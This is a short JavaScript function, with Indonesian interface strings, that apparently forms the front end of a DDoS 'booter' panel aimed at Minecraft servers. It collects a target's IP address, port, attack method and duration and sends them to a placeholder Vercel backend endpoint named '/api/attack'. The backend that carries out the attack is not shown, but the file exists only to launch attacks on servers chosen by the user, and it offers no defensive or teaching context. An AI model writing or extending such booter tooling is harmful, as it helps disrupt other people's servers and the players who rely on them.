function startAttack() {
    let serverIp = document.getElementById("serverIp").value;
    let serverPort = document.getElementById("serverPort").value;
    let method = document.getElementById("attackMethod").value;
    let duration = document.getElementById("duration").value;
    let status = document.getElementById("status");

    if (!serverIp || !serverPort) {
        alert("Masukkan IP dan Port server Minecraft!");
        return;
    }

    status.innerText = "Memulai serangan...";

    fetch("https://your-vercel-backend.vercel.app/api/attack", { // Ganti dengan URL backend Vercel Anda
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ serverIp, serverPort, method, duration })
    })
    .then(response => response.json())
    .then(data => status.innerText = data.message)
    .catch(error => status.innerText = "Gagal memulai serangan!");
}
